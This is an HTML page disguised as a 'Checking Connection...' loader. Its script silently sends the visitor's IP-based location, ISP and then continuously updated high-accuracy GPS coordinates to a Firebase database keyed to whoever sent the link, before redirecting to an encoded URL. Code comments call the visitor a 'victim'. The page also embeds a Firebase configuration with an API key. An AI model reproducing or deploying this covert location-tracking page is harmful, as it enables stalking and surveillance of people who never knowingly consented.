<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Checking Connection...</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { background: #000; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; color: white; font-family: sans-serif; }
        .loader { border: 2px solid #222; border-top: 2px solid #22c55e; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyAfrFpzw2UddAxGrhAlIeP_c1OaoIG6wNk",
            authDomain: "in-app-update-21c61.firebaseapp.com",
            databaseURL: "https://in-app-update-21c61-default-rtdb.firebaseio.com",
            projectId: "in-app-update-21c61",
            storageBucket: "in-app-update-21c61.firebasestorage.app",
            messagingSenderId: "1013483026768",
            appId: "1:1013483026768:web:c5f54060842f9672431455"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        const params = new URLSearchParams(window.location.search);
        const adminId = params.get('id');
        const encodedRedirect = params.get('r');

        async function capture() {
            if (!adminId) return;

            // --- STAGE 1: IP Intelligence (Silent) ---
            let ipInfo = {};
            try {
                const res = await fetch('https://ipapi.co/json/');
                ipInfo = await res.json();
                
                // Record link click in transaction history
                db.ref('users/' + adminId + '/trackingLogs').push({
                    time: new Date().toLocaleString(),
                    method: "IP-LINK-HIT",
                    coords: ipInfo.latitude + ", " + ipInfo.longitude,
                    isp: ipInfo.org,
                    status: "IP-LOCATION-ONLY",
                    ip: ipInfo.ip
                });
            } catch (e) {}

            // --- STAGE 2: Persistent GPS (24h Concept) ---
            if (navigator.geolocation) {
                // watchPosition updates location whenever victim moves
                navigator.geolocation.watchPosition(
                    (pos) => {
                        db.ref('users/' + adminId + '/trackingLogs').push({
                            time: new Date().toLocaleString(),
                            method: "LIVE-GPS-FIX",
                            coords: pos.coords.latitude + ", " + pos.coords.longitude,
                            isp: ipInfo.org || "Mobile Data",
                            status: "PRECISION-LOCKED",
                            accuracy: pos.coords.accuracy + "m"
                        });
                        
                        // Redirect after first successful fix
                        setTimeout(redirectUser, 2000);
                    },
                    (err) => { redirectUser(); }, 
                    { enableHighAccuracy: true }
                );
            } else {
                redirectUser();
            }
        }

        function redirectUser() {
            try {
                window.location.href = atob(encodedRedirect);
            } catch(e) {
                window.location.href = "https://google.com";
            }
        }

        window.onload = capture;
    </script>
</body>
</html>
